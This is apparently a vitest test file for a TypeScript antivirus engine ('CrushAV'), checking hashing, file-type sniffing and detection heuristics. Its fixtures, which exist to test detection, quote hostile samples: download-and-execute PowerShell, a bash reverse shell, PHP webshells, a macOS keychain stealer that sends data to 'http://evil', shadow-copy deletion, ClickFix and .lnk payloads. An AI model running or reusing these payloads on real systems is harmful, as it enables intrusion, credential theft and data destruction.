import { createHash, randomBytes } from 'node:crypto';
import { describe, expect, it } from 'vitest';
import {
  applyReputation,
  EICAR,
  mergeReputation,
  queryCircl,
  scanBytes,
  Sha256,
  sha256Hex,
  SignatureSet,
  sniffKind,
  type AvFileResult,
} from '../index';

const enc = (s: string) => new TextEncoder().encode(s);
const latin1 = (s: string) => Uint8Array.from(s, (c) => c.charCodeAt(0) & 0xff);
const scan = (name: string, body: string | Uint8Array) => scanBytes({ name, bytes: typeof body === 'string' ? enc(body) : body });
const ids = (r: AvFileResult) => r.detections.map((d) => d.id);

const PE = (extra = '') => {
  const b = new Uint8Array(512 + extra.length);
  b[0] = 0x4d; b[1] = 0x5a;
  b.set(latin1(extra), 512);
  return b;
};
const wide = (s: string) => {
  const out = new Uint8Array(s.length * 2);
  for (let i = 0; i < s.length; i++) out[i * 2] = s.charCodeAt(i);
  return out;
};

describe('sha256', () => {
  it('matches node crypto at block boundaries and in chunks', async () => {
    for (const n of [0, 1, 55, 56, 63, 64, 65, 119, 120, 1000, 100_003]) {
      const data = randomBytes(n);
      const want = createHash('sha256').update(data).digest('hex');
      expect(new Sha256().update(data).hex()).toBe(want);
      const chunked = new Sha256();
      for (let i = 0; i < n; i += 37) chunked.update(data.subarray(i, i + 37));
      expect(chunked.hex()).toBe(want);
      expect(await sha256Hex(data)).toBe(want);
    }
  });
});

describe('sniffKind', () => {
  it('recognises common formats by magic bytes', () => {
    expect(sniffKind(PE())).toBe('pe');
    expect(sniffKind(latin1('\x7fELF\x02\x01'))).toBe('elf');
    expect(sniffKind(latin1('%PDF-1.7\n'))).toBe('pdf');
    expect(sniffKind(latin1('PK\x03\x04xxxx'))).toBe('zip');
    expect(sniffKind(latin1('#!/bin/sh\necho hi'))).toBe('script');
    expect(sniffKind(latin1('\x89PNG\r\n\x1a\n'))).toBe('image');
    expect(sniffKind(enc('hello world'))).toBe('text');
  });
});

describe('EICAR', () => {
  it('is caught by signature and is the only detection', async () => {
    const r = await scan('eicar.com', EICAR);
    expect(r.verdict).toBe('malicious');
    expect(r.sha256).toBe('275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f');
    expect(ids(r)).toEqual(['CrushAV.Signature.EICAR-Test-File']);
  });
  it('is caught by the rule when followed by whitespace', async () => {
    const r = await scan('eicar.txt', `${EICAR}\r\n`);
    expect(ids(r)).toContain('CrushAV.Test.EICAR');
  });
});

describe('disguises', () => {
  it('flags a program named like a PDF as malicious', async () => {
    const r = await scan('invoice.pdf', PE());
    expect(r.verdict).toBe('malicious');
    expect(ids(r)).toContain('CrushAV.Disguise.ExecutableAsDocument');
  });
  it('does not flag a normal .exe', async () => {
    expect((await scan('setup.exe', PE())).verdict).toBe('clean');
  });
  it('flags double extensions and RTLO names', async () => {
    expect(ids(await scan('C:\\Users\\a\\Downloads\\invoice.pdf.exe', PE()))).toContain('CrushAV.Disguise.DoubleExtension');
    expect(ids(await scan('photo\u202Egpj.exe', PE()))).toContain('CrushAV.Disguise.RightToLeftOverride');
    expect((await scan('report.final.docx', latin1('PK\x03\x04word/document.xml'))).verdict).toBe('clean');
  });
});

describe('PowerShell', () => {
  it('treats a well-known installer one-liner as suspicious, not malicious', async () => {
    const r = await scan('install.ps1', "Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))");
    expect(r.verdict).toBe('suspicious');
  });
  it('treats hidden + bypass + download-execute as malicious', async () => {
    const r = await scan('update.bat', 'powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://1.2.3.4/a\')"'.replace('-ep', '-ExecutionPolicy'));
    expect(r.verdict).toBe('malicious');
  });
  it('flags a long encoded command', async () => {
    const r = await scan('run.cmd', `powershell.exe -NoP -enc ${'A'.repeat(120)}`);
    expect(ids(r)).toContain('CrushAV.PowerShell.EncodedCommand');
  });
  it('ignores the same text in a document', async () => {
    expect((await scan('notes.md', `powershell.exe -enc ${'A'.repeat(120)}`)).verdict).toBe('clean');
  });
});

describe('scripts', () => {
  it('catches a JS dropper', async () => {
    const js = 'var s=new ActiveXObject("WScript.Shell");var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","http://x/p.exe");s.Run("p.exe")';
    expect((await scan('Invoice_2026.js', js)).verdict).toBe('malicious');
    expect((await scan('app.mjs', js)).verdict).toBe('clean');
  });
  it('catches reverse shells only in scripts', async () => {
    const line = 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1';
    expect((await scan('x.sh', `#!/bin/bash\n${line}`)).verdict).toBe('malicious');
    expect((await scan('pentest-notes.md', line)).verdict).toBe('clean');
  });
  it('catches PHP webshells', async () => {
    expect((await scan('wp-content/uploads/x.php', '<?php @eval($_POST["c"]); ?>')).verdict).toBe('malicious');
    expect((await scan('x.php', '<?php eval(gzinflate(base64_decode("abc"))); ?>')).verdict).toBe('malicious');
    expect((await scan('index.php', '<?php echo htmlspecialchars($_GET["q"]); ?>')).verdict).toBe('clean');
    expect((await scan('x.php', '<?php system(base64_decode(gzinflate($_REQUEST["x"]))); ?>')).verdict).toBe('malicious');
  });
  it('webshell regex stays linear on hostile input (ReDoS guard)', async () => {
    const hostile = `<?php eval(${'\tgzinflate('.repeat(50000)}`;
    const t0 = Date.now();
    await scan('evil.php', hostile);
    expect(Date.now() - t0).toBeLessThan(1000);
  });
  it('catches a macOS fake password prompt stealer', async () => {
    const t = 'osascript -e \'display dialog "macOS needs your password" default answer "" with hidden answer\'\ncp ~/Library/Keychains/login.keychain-db /tmp/x\ncurl -F f=@/tmp/x http://evil';
    expect((await scan('install.command', t)).verdict).toBe('malicious');
  });
});

describe('ransomware', () => {
  it('two backup-wiping commands in a batch file are malicious, one is suspicious', async () => {
    expect((await scan('a.bat', 'vssadmin delete shadows /all /quiet\nbcdedit /set {default} recoveryenabled no')).verdict).toBe('malicious');
    expect((await scan('a.bat', 'vssadmin delete shadows /all /quiet')).verdict).toBe('suspicious');
  });
  it('sees UTF-16 strings inside a Windows binary', async () => {
    const b = new Uint8Array([...PE(), ...wide('vssadmin.exe delete shadows /all /quiet'), 0, 0, ...wide('wbadmin delete catalog -quiet')]);
    expect((await scan('svc.exe', b)).verdict).toBe('malicious');
  });
  it('recognises a ransom note but not an article in markdown', async () => {
    const note = 'All your files have been encrypted! To get the decryption key send 0.1 BTC to the address below and contact us via our .onion site.';
    expect((await scan('README_RESTORE.txt', note)).verdict).toBe('malicious');
    expect((await scan('ransomware-explained.md', note)).verdict).toBe('clean');
  });
});

describe('other rules', () => {
  it('flags a coin miner config', async () => {
    expect((await scan('config.json', '{"pools":[{"url":"stratum+tcp://pool.minexmr.com:4444"}],"donate-level":1}')).verdict).toBe('suspicious');
  });
  it('flags Mimikatz strings in a PE', async () => {
    expect((await scan('m.exe', PE('sekurlsa::logonpasswords'))).verdict).toBe('malicious');
  });
  it('flags ClickFix pages', async () => {
    const html = '<button onclick="navigator.clipboard.writeText(\'powershell -w h -c iwr http://x|iex\')">I\'m not a robot</button> Press Windows + R then Ctrl + V';
    expect((await scan('captcha.html', html)).verdict).toBe('malicious');
  });
  it('flags a booby-trapped shortcut', async () => {
    const lnk = new Uint8Array([0x4c, 0, 0, 0, 1, 0x14, 2, 0, ...new Uint8Array(70), ...wide('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'), 0, 0, ...wide('-c iwr https://evil.example/p.ps1|iex')]);
    expect((await scan('Document.pdf.lnk', lnk)).verdict).toBe('malicious');
  });
  it('flags macros smuggled into a .docx but only informs for .docm', async () => {
    const zip = latin1('PK\x03\x04....word/vbaProject.bin....');
    expect((await scan('cv.docx', zip)).verdict).toBe('suspicious');
    const docm = await scan('budget.xlsm', zip);
    expect(docm.verdict).toBe('clean');
    expect(ids(docm)).toContain('CrushAV.Office.MacroEnabled');
  });
  it('treats PDF JavaScript as info and /Launch cmd.exe as malicious', async () => {
    expect((await scan('form.pdf', '%PDF-1.7\n/OpenAction << /S /JavaScript /JS (app.alert(1)) >>')).verdict).toBe('clean');
    expect((await scan('doc.pdf', '%PDF-1.4\n/OpenAction << /S /Launch /Win << /F (cmd.exe) >> >>')).verdict).toBe('malicious');
  });
  it('flags HTML smuggling and SVG redirects', async () => {
    const smuggle = `<script>var d=atob("${'QUFB'.repeat(6000)}");var b=new Blob([d]);var a=document.createElement("a");a.href=URL.createObjectURL(b);a.download="invoice.iso";a.click()</script>`;
    expect((await scan('invoice.html', smuggle)).verdict).toBe('suspicious');
    expect((await scan('logo.svg', '<svg><script>window.location.href=atob("aHR0cDovL3g=")</script></svg>')).verdict).toBe('suspicious');
    expect((await scan('logo.svg', '<svg><circle r="4"/></svg>')).verdict).toBe('clean');
  });
});

describe('false-positive regressions (measured on real files)', () => {
  it('a Node bundle carrying detection strings is not a Windows script', async () => {
    const bundle = 'const RULES=[/Invoke-WebRequest/,/IEX/,"vssadmin delete shadows /all","bcdedit /set {default} recoveryenabled no"];module.exports={run(){return Promise.resolve().then(()=>x.Invoke())}}';
    expect((await scan('dist/index.js', bundle)).verdict).toBe('clean');
  });
  it('a test source file quoting a ransom note and a stealer is clean', async () => {
    const src = 'const note = "All your files have been encrypted! send BTC via .onion"; const s = "display dialog x with hidden answer; curl Keychains";';
    expect((await scan('engine.test.ts', src)).verdict).toBe('clean');
  });
  it('random bytes inside an ELF never trip PowerShell rules', async () => {
    const elf = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, ...latin1('\0\0 iwr \0 IEX \0 x.Invoke() \0 DownloadFile \0')]);
    expect((await scan('/usr/bin/ctr', elf)).verdict).toBe('clean');
  });
});

describe('signatures + reputation', () => {
  it('loads a custom signature list', async () => {
    const sigs = new SignatureSet([]);
    const body = enc('pretend malware');
    const h = await sha256Hex(body);
    expect(sigs.load(`# comment\n${h} Trojan.Test\nnot-a-hash x\n`)).toBe(1);
    const r = await scanBytes({ name: 'x.bin', bytes: body }, { signatures: sigs });
    expect(r.verdict).toBe('malicious');
    expect(r.detections[0].name).toBe('Trojan.Test');
  });
  it('known-good downgrades suspicious heuristics but not malicious ones', async () => {
    const sus = await scan('install.ps1', "iex ((New-Object Net.WebClient).DownloadString('https://x'))");
    expect(sus.verdict).toBe('suspicious');
    const trusted = { sha256: sus.sha256!, knownMalicious: null, malwareName: null, trust: 100, fileName: null };
    expect(applyReputation(sus, trusted).verdict).toBe('clean');
    const disguised = await scan('a.pdf', PE());
    expect(applyReputation(disguised, { ...trusted, sha256: disguised.sha256! }).verdict).toBe('malicious');
  });
  it('known-malicious adds a detection', async () => {
    const r = await scan('a.txt', 'hello');
    const out = applyReputation(r, { sha256: r.sha256!, knownMalicious: 'malshare.com', malwareName: null, trust: 0, fileName: null });
    expect(out.verdict).toBe('malicious');
  });
  it('parses CIRCL and never trusts a known-malicious hash', async () => {
    const h = '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f';
    const fake = (async () => new Response(JSON.stringify({ KnownMalicious: 'malshare.com', 'hashlookup:trust': 100, FileName: 'eicar.com' }), { status: 200 })) as typeof fetch;
    const rep = await queryCircl(h, fake);
    expect(rep).toMatchObject({ knownMalicious: 'malshare.com', trust: 0, fileName: 'eicar.com' });
    const missing = (async () => new Response('{}', { status: 404 })) as typeof fetch;
    expect(await queryCircl(h, missing)).toBeNull();
    expect(mergeReputation(h, [null, { sha256: h, knownMalicious: null, malwareName: null, trust: 80, fileName: null }, rep])?.knownMalicious).toBe('malshare.com');
  });
});
